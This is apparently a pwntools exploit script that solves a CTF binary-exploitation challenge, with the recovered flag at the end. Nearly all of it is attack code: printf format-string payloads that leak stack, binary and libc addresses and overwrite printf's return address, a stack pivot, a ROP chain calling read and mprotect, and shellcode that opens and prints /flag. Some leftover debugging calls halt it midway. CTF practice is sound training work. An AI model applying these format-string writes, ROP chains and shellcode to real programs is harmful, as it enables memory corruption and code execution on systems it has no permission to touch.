from pwn import *

binary = './attachment_patched'
libc = ELF('./libc.so.6')
context.binary = binary
context.arch = 'amd64'
p = process(binary)
#p = remote("chal.polyuctf.com", 34168)
s = '''
b * printf
b * printf+198
'''

def padding(written, bytes_to_write, maximum):
	if written % maximum < bytes_to_write:
		return bytes_to_write - (written % maximum)
	else:
		return maximum - (written % maximum) + bytes_to_write
# leaking a stack address, to overwrite an existing stack address to rsp and overwrite rsp of printf

payload = b"%6$p" # can only leak one address

p.recvuntil(b"give you one chance!!!\n")


p.sendline(payload)

leak = p.recvline().strip().decode()
leak = int(leak, 16)
rip_pos = leak - 0x120

print("Rip position: ", hex(rip_pos))

# partial overwriting the first byte of return address of `printf` to 0x10, changing it to return to main+5
bytes_to_write = rip_pos & 0xffff
payload = f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()
written = bytes_to_write
bytes_to_write = padding(written, 0x10, 0x100) # max being 0x100 for hhn
pos = int(0x118 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hhn".encode()

p.recvuntil(b"begin your challenge\n")
gdb.attach(p, s)
p.sendline(payload)
p.interactive()

# leaking another address
payload = b"%19$p"

p.recvuntil(b"give you one chance!!!\n")
p.send(payload)

leak = int(p.recv(14).decode(), 16)
elf_base = leak - 0x140b
buf = elf_base + 0x4060
print("Buf: ", hex(buf))


# again partial overwriting the return address of printf to return to main+5
rip_pos = rip_pos - 0x20
bytes_to_write = rip_pos & 0xffff
payload = f"%{bytes_to_write-8}c%c%c%c%c%c%c%c%c%hn".encode()
written = bytes_to_write
bytes_to_write = padding(written, 0x10, 0x100) # max being 0x100 for hhn
pos = int(0x138 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hhn".encode()

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


# leaking another address, the libc address
payload = b"%3$p"
p.send(payload)
p.recvuntil(b"give you one chance!!!\n")
leak = int(p.recv(14).decode(), 16)
libc_base = leak - 0x10e1f2
print("libc base: ", hex(libc_base))


# partial overwriting the return address of printf to return to main+115 so that the rbp and rsp doesn't move
rip_pos = rip_pos - 0x20
bytes_to_write = rip_pos & 0xffff
payload = f"%{bytes_to_write-12}c%c%c%c%c%c%c%c%c%c%c%c%c%hn".encode()
written = bytes_to_write
bytes_to_write = padding(written, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hhn".encode()

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)




# changing rbp to buf
rbp_pos = rip_pos + 0x28 
bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
bytes_to_write = padding(written, rbp_pos & 0xffff, 0x10000)
pos = int(0xf8 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
payload += b'A' * 0x30

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


buf = buf + 8
bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
pos = int(0x168 / 8 + 6)
print(hex(buf & 0xffff))
bytes_to_write = padding(written, buf & 0xffff, 0x10000)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
written += bytes_to_write
print(len(payload))

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
bytes_to_write = padding(written, (rbp_pos + 2) & 0xffff, 0x10000)
pos = int(0xf8 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
payload += b'A' * 0x30

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
pos = int(0x168 / 8 + 6)
print(hex(buf & 0xffff))
bytes_to_write = padding(written, (buf >> 16) & 0xffff, 0x10000)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
written += bytes_to_write
print(len(payload))

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
bytes_to_write = padding(written, (rbp_pos + 4) & 0xffff, 0x10000)
pos = int(0xf8 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
payload += b'A' * 0x30

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
pos = int(0x168 / 8 + 6)
print(hex(buf & 0xffff))
bytes_to_write = padding(written, (buf >> 32 )& 0xffff, 0x10000)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
written += bytes_to_write
print(len(payload))

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)







# changing rbp + 8 to leave ; ret, preparing for leave ; ret twice
leave_ret = buf - 0x4060 - 8 + 0x1409
print(hex(leave_ret))
bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
bytes_to_write = padding(written, (rbp_pos + 8) & 0xffff, 0x10000)
pos = int(0xf8 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
payload += b'A' * 0x30

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
pos = int(0x168 / 8 + 6)
print(hex(buf & 0xffff))
bytes_to_write = padding(written, leave_ret & 0xffff, 0x10000)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
written += bytes_to_write
print(len(payload))

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
bytes_to_write = padding(written, (rbp_pos + 10) & 0xffff, 0x10000)
pos = int(0xf8 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
payload += b'A' * 0x30

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
pos = int(0x168 / 8 + 6)
print(hex(buf & 0xffff))
bytes_to_write = padding(written, (leave_ret >> 16)& 0xffff, 0x10000)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
written += bytes_to_write
print(len(payload))

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
bytes_to_write = padding(written, (rbp_pos + 12) & 0xffff, 0x10000)
pos = int(0xf8 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
payload += b'A' * 0x30

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
pos = int(0x168 / 8 + 6)
print(hex(buf & 0xffff))
bytes_to_write = padding(written, (leave_ret >> 32)& 0xffff, 0x10000)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
written += bytes_to_write
print(len(payload))

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
bytes_to_write = padding(written, (rbp_pos + 14) & 0xffff, 0x10000)
pos = int(0xf8 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
payload += b'A' * 0x30

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
pos = int(0x168 / 8 + 6)
print(hex(buf & 0xffff))
bytes_to_write = padding(written, 0 & 0xffff, 0x10000)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
written += bytes_to_write
print(len(payload))

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)



# changing the return address to leave ; ret
bytes_to_write = padding(0, 0x9, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn------".encode()


# gadgets

pop_rdi = libc_base + 0x0000000000023b6a
pop_rsi = libc_base + 0x000000000002601f
pop_rdx_r12 = libc_base + 0x0000000000119431
mprotect = libc_base + 0x118bc0
read = libc_base + libc.sym['read']

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(buf)
payload += p64(pop_rdx_r12)
payload += p64(0x1000)
payload += p64(0)
payload += p64(read)
#payload += p64(0xdeadbeef)

payload2 = b'A' * 0x48
payload2 += flat(
	pop_rdi,
	elf_base + 0x4000,
	pop_rsi,
	0x1000,
	pop_rdx_r12,
	7,
	0, # dummy
	mprotect,
	buf + 0x48 + 9 * 8
)

shellcode = asm('''
    /* Open the file */
    push 257
    pop rax
    mov rdi, -100       /* dirfd: AT_FDCWD */
    lea rsi, [rip+flag] /* pointer to "CDr46w9anrq3vg0Z" */
    xor edx, edx        /* flags: O_RDONLY */
    syscall

    /* Read and write in one step */
    push rax
    pop rdi
    xor eax, eax        /* syscall: read */
    sub rsp, 64         /* smaller buffer */
    mov rsi, rsp        /* buffer address */
    mov rdx, 64         /* buffer size */
    syscall
    
    /* Write to stdout */
    push rax
    pop rdx
    mov rax, 1          /* syscall: write */
    mov rdi, 1          /* fd: stdout */
    /* rsi already points to our buffer */
    syscall

flag:
    .string "/flag" 

''')

payload2 += shellcode

#gdb.attach(p, s)
p.send(payload)
p.sendline(payload2)

p.interactive()

'''
flag
PUCTF25{d4rk_d474_lurk5_d33p_GoBmQHBvsvnUk0Kk9v4XvQbFPzvBuvIJ}
'''
